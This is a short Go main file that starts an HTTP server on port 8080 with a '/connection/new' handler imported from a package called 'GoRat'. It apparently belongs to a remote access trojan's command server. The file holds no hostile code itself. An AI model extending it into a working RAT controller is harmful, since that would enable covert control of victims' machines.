package main

import (
	"net/http"

	"github.com/NotKatsu/GoRat/endpoints"
	"github.com/pterm/pterm"
)

func main() {
	http.HandleFunc("/connection/new", endpoints.ConnectionNew)
	err := http.ListenAndServe(":8080", nil)

	if err != nil {
		pterm.Fatal.WithFatal(true).Println(err)
	}
}
